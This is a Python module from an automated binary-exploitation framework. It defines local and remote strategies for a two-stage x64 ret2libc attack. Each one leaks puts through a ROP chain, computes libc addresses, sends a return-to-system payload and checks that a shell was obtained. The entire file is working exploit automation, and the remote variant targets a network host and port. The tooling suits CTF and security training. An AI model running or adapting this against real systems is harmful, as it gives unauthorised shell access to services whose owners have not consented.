"""P7.4: x64 ret2libc-put strategies (local + remote).

Replaces the v3.1 monolith's ``ret2libc_put_x64`` (L1773-1868, local)
+ ``ret2libc_put_x64_remote`` (L2044-2104, remote) ad-hoc 2-stage
functions with two :class:`ExploitStrategy` subclasses.

x64 vs x32 differences
-----------------------
* Stage 1 uses a ROP gadget chain: ``pop_rdi; ret`` to load
  ``puts_got`` into RDI, then ``puts_plt``, then return to
  ``main``.  This is the x64 calling convention for passing
  the first argument.
* Leak parse uses ``u64(io.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00'))``
  — the high byte 0x7f is a tell-tale sign of a libc address
  in 64-bit Linux userspace; we take the 6 bytes before it
  and left-pad with 2 NUL bytes to form a full 8-byte u64.
* Stage 2 includes the ``ret`` alignment gadget (P6.2
  §64-bit alignment fix) between ``sh_addr`` and ``system_addr``
  to avoid MOVAPS SIGSEGV on Ubuntu 18.04+ glibc.

Per ``rebuild.md`` §6.8 P7.4 + ``refactor.md`` §3.2.2 + P6.3
primitive contract.
"""
from __future__ import annotations

import datetime

from autopwn.context import ExploitContext
from autopwn.core.logging import print_info, print_payload, print_section_header, print_success, print_warning
from autopwn.exp.base import ExploitStrategy
from autopwn.exp.priorities import RET2LIBC_PUT
from autopwn.exp.registry import register
from autopwn.primitives.ret2libc_put import Ret2LibcPutX64
from autopwn.report.model import ExploitInfo
from autopwn.core.shell_verify import verify_shell


# ---------------------------------------------------------------------------
# Local x64 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcPutX64LocalStrategy(ExploitStrategy):
    """Local 64-bit 2-stage ret2libc via ``puts(puts@GOT)`` leak.

    Metadata (``requires_*``):
      * ``arch = 64``
      * ``remote = False``
      * ``requires = ("has_puts",)`` — needs ``puts`` in PLT.
        The x64 ROP gadgets (pop_rdi, ret) are populated by
        P4.4 ``find_x64`` regardless of which strategies match,
        so they're not in ``requires`` (defensive check
        inside the primitive catches missing gadgets).

    Priority ``RET2LIBC_PUT = 120`` per 附录 A.

    ``ctx.gadgets_x64`` defensive check
    -----------------------------------
    If the recon phase failed to find ``pop_rdi`` or ``ret``,
    the primitive returns ``b""`` and the strategy returns
    ``False`` to skip.  This is cleaner than crashing inside
    a p64() call.
    """

    name = "ret2libc-put-x64"
    priority = RET2LIBC_PUT
    requires_arch = 64
    requires_remote = False
    requires = ("has_puts",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit 2-stage ret2libc locally."""
        from pwn import process, u64

        if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0:
            print_info("ret2libc-put-x64: ctx.gadgets_x64 missing pop_rdi; skipping")
            return False

        print_section_header("EXPLOITATION: ret2libc (puts) - x64")
        print_payload("preparing ret2libc exploit using puts function")

        primitive = Ret2LibcPutX64()

        # Stage 1: leak.
        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-put-x64 stage1 primitive returned empty; skipping")
            return False

        io = process(str(ctx.binary.path))
        io.recv()
        io.sendline(payload1)
        print_payload("sending puts leak payload")

        try:
            puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
        except Exception as e:
            print_info(f"ret2libc-put-x64 leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        # Stage 2: return-to-system.
        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            print_info("ret2libc-put-x64 stage2 primitive returned empty; skipping")
            return False

        io.sendline(payload2)

        info = ExploitInfo(
            exploit_type="ret2libc (puts) - x64",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        from autopwn.report import record_success
        record_success(info)

        id_ok, id_output = verify_shell(io)

        if not id_ok:

            print_warning(f"Ret2LibcPutX64LocalStrategy: shell verification failed (no uid= output)")

            return False

        ctx.id_output = id_output
        return True


# ---------------------------------------------------------------------------
# Remote x64 strategy
# ---------------------------------------------------------------------------


@register
class Ret2LibcPutX64RemoteStrategy(ExploitStrategy):
    """Remote 64-bit 2-stage ret2libc via ``puts(puts@GOT)`` leak.

    Same flow as :class:`Ret2LibcPutX64LocalStrategy` but
    ``pwn.remote(host, port)`` instead of ``pwn.process(path)``.
    The remote leak-parse uses ``u64(io.recv(8))`` (size-known
    8-byte read) instead of the local ``recvuntil(b'\\x7f')``
    heuristic — network jitter makes the recvuntil timeout-flaky.
    """

    name = "ret2libc-put-x64-remote"
    priority = RET2LIBC_PUT
    requires_arch = 64
    requires_remote = True
    requires = ("has_puts",)

    def run(self, ctx: ExploitContext) -> bool:
        """Execute the 64-bit 2-stage ret2libc against a remote service."""
        from pwn import remote, u64

        if ctx.remote is None:
            print_info("ret2libc-put-x64-remote: ctx.remote is None; skipping")
            return False
        host, port = ctx.remote

        if ctx.gadgets_x64 is None or ctx.gadgets_x64.pop_rdi == 0:
            print_info("ret2libc-put-x64-remote: ctx.gadgets_x64 missing pop_rdi; skipping")
            return False

        print_section_header("EXPLOITATION: ret2libc (puts) - x64 Remote")
        print_payload("preparing remote ret2libc exploit using puts function")

        primitive = Ret2LibcPutX64()

        payload1 = primitive.build_payload(ctx)
        if not payload1:
            print_info("ret2libc-put-x64-remote stage1 primitive returned empty; skipping")
            return False

        io = remote(host, port)
        io.recv()
        io.sendline(payload1)
        print_payload("sending puts leak payload")

        try:
            puts_addr = u64(io.recv(8))
        except Exception as e:
            print_info(f"ret2libc-put-x64-remote leak parse failed: {e}")
            return False
        print_success(f"puts address leaked: {hex(puts_addr)}")

        payload2 = primitive.build_stage2_payload(ctx, puts_addr)
        if not payload2:
            return False

        io.sendline(payload2)

        info = ExploitInfo(
            exploit_type="ret2libc (puts) - x64 Remote",
            payload=payload2,
            padding=ctx.padding,
            addresses={
                "puts_addr": puts_addr,
            },
            vulnerability_type="Stack Buffer Overflow",
            architecture="x64",
            target_binary=ctx.binary.path.name,
            timestamp=datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        )

        from autopwn.report import record_success
        record_success(info)

        id_ok, id_output = verify_shell(io)

        if not id_ok:

            print_warning(f"Ret2LibcPutX64LocalStrategy: shell verification failed (no uid= output)")

            return False

        ctx.id_output = id_output
        return True


__all__ = [
    "Ret2LibcPutX64LocalStrategy",
    "Ret2LibcPutX64RemoteStrategy",
]
